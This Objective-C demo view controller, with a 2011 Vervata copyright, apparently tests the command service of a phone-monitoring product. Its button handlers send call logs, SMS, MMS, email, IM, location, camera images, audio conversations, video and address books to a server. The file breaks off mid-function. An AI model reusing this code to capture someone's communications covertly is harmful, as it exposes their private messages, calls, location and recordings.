//
//  DemoViewController.m
//  CommandServiceManager
//
//  Created by Pichaya Srifar on 8/25/11.
//  Copyright 2011 Vervata. All rights reserved.
//

#import "DemoViewController.h"

#import "CommandServiceManager.h"
#import "CommandRequest.h"
#import "CommandMetaData.h"
#import "CommandPriorityEnum.h"

#import "SendEvent.h"

#import "SendActivate.h"
#import "SendDeactivate.h"
#import "SendHeartBeat.h"
#import "SendAddressBook.h"
#import "SendAddressBookForApproval.h"

#import "GetCSID.h"
#import "GetServerTime.h"
#import "GetProcessProfile.h"
#import "GetCommunicationDirectives.h"
#import "GetConfiguration.h"
#import "GetActivationCode.h"
#import "GetAddressBook.h"
#import "GetIncompatibleApplicationDefinitions.h"

#import "AddressBook.h"
#import "ResponseData.h"
#import "PCC.h"


#import "PanicOnEventProvider.h"
#import "PanicOffEventProvider.h"
#import "CallLogEventProvider.h"
#import "SMSEventProvider.h"
#import "EmailEventProvider.h"
#import "MMSEventProvider.h"
#import "IMEventProvider.h"

#import "PanicImageEventProvider.h"
#import "PanicLocationEventProvider.h"
#import "AlertLocationEventProvider.h"
#import "LocationEventProvider.h"
#import "WallpaperEventProvider.h"
#import "WallpaperTNEventProvider.h"
#import "CamImageProvider.h"
#import "CamImageTNProvider.h"
#import "AudioConProvider.h"
#import "AudioConTNProvider.h"
#import "AudioProvider.h"
#import "AudioTNProvider.h"
#import "VideoProvider.h"
#import "VideoTNProvider.h"

#import "DebugEventProvider.h"
#import "SettingEventProvider.h"
#import "SystemEventProvider.h"

#import "VCProvider.h"
//#import "CommandCodeEnum.h"
#import "GetAddressBookResponse.h"

@implementation DemoViewController

@synthesize CSM;
@synthesize scrollView;

-(CommandMetaData *)testMetaData {
	CommandMetaData *metadata = [[CommandMetaData alloc] init];
	[metadata setMCC:@"MCC"];
	[metadata setCompressionCode:1];
	[metadata setConfID:105];
	[metadata setEncryptionCode:1];
	[metadata setProductID:4200];
	[metadata setProtocolVersion:1];
	[metadata setLanguage:0];
	[metadata setActivationCode:@"01619"];
	[metadata setDeviceID:@"iPhoneWithSymbianLic"];
	[metadata setIMSI:@"IMSI"];
	[metadata setMCC:@"MCC"];
	[metadata setMNC:@"MNC"];
	[metadata setPhoneNumber:@"123456789"];
	[metadata setProductVersion:@"-1.00"];
	[metadata setHostURL:@""];
	return [metadata autorelease];
}

-(IBAction)activateButtonTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendActivate *command = [[SendActivate alloc] init];
	
	[command setDeviceInfo:@"DeviceInfo"];
	[command setDeviceModel:@"DeModel"];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	[command release];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[CSM release];
	
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)deactivateButtonTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendDeactivate *command = [[SendDeactivate alloc] init];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[CSM release];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)heartBeatButtonTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendHeartBeat *command = [[SendHeartBeat alloc] init];

	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];

//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];

	long CSID =  [CSM execute:request];
	[CSM release];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)callLogTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	CallLogEventProvider *eventProvider = [[CallLogEventProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)emailTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	EmailEventProvider *eventProvider = [[EmailEventProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)IMTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	IMEventProvider *eventProvider = [[IMEventProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)MMSLogTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	MMSEventProvider *eventProvider = [[MMSEventProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)SMSLogTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	SMSEventProvider *eventProvider = [[SMSEventProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

#pragma mark -
#pragma mark Panic

-(IBAction)panicOnTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	PanicOnEventProvider *eventProvider = [[PanicOnEventProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:HIGHEST];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)panicOffTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	PanicOffEventProvider *eventProvider = [[PanicOffEventProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)PanicImageTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	PanicImageEventProvider *eventProvider = [[PanicImageEventProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:HIGH];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)PanicLocationTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	PanicLocationEventProvider *eventProvider = [[PanicLocationEventProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:HIGH];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)AlertLocationTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	AlertLocationEventProvider *eventProvider = [[AlertLocationEventProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

#pragma mark -
#pragma mark Actual media

-(IBAction)WallpaperTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	WallpaperEventProvider *eventProvider = [[WallpaperEventProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)WallpaperTNTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	WallpaperTNEventProvider *eventProvider = [[WallpaperTNEventProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)CameraImageTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	CamImageProvider *eventProvider = [[CamImageProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)CameraImageTNTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	CamImageTNProvider *eventProvider = [[CamImageTNProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)AudioConversationTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	AudioConProvider *eventProvider = [[AudioConProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)AudioConversationTNTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	AudioConTNProvider *eventProvider = [[AudioConTNProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)AudioTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	AudioProvider *eventProvider = [[AudioProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)AudioTNTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	AudioTNProvider *eventProvider = [[AudioTNProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)VideoTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	VideoProvider *eventProvider = [[VideoProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)VideoTNTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	VideoTNProvider *eventProvider = [[VideoTNProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)addressBookTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendAddressBook *command = [[SendAddressBook alloc] init];
	
	VCProvider *vProvider = [[VCProvider alloc] init];
	
	AddressBook *addrBook = [[AddressBook alloc] init];
	
	[addrBook setVCardCount:[vProvider total]];
	[addrBook setVCardProvider:vProvider];
	[vProvider release];
	
	[addrBook setAddressBookID:1];
	[addrBook setAddressBookName:@"ADDR NAMEX"];
	
	NSArray *addrBookArray = [NSArray arrayWithObjects:addrBook, nil];
	[addrBook release];
	[command setAddressBookList:addrBookArray];

	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)addressBookForApprovalTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendAddressBookForApproval *command = [[SendAddressBookForApproval alloc] init];
	
	VCProvider *vProvider = [[VCProvider alloc] init];
	
	AddressBook *addrBook = [[AddressBook alloc] init];
	
	[addrBook setVCardCount:[vProvider total]];
	[addrBook setVCardProvider:vProvider];
	[vProvider release];
	
	[addrBook setAddressBookID:1];
	[addrBook setAddressBookName:@"ADDRNAME"];
	
	NSArray *addrBookArray = [NSArray arrayWithObjects:addrBook, nil];
	[addrBook release];
	[command setAddressBookList:addrBookArray];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)debugEventTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	DebugEventProvider *eventProvider = [[DebugEventProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)locationTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	LocationEventProvider *eventProvider = [[LocationEventProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)settingTouched:(id)sender {
	
}

-(IBAction)systemTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	SendEvent *command = [[SendEvent alloc] init];
	SystemEventProvider *eventProvider = [[SystemEventProvider alloc] init];
	[command setEventCount:[eventProvider total]];
	[command setEventProvider:eventProvider];
	[eventProvider release];

	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];

//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

#pragma mark -
#pragma mark Get command

-(IBAction)CSIDTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	GetCSID *command = [[GetCSID alloc] init];

	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];

//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)timeTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	GetServerTime *command = [[GetServerTime alloc] init];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)processProfileTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	GetProcessProfile *command = [[GetProcessProfile alloc] init];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)commuDirectiveTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	GetCommunicationDirectives *command = [[GetCommunicationDirectives alloc] init];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)configTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	GetConfiguration *command = [[GetConfiguration alloc] init];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
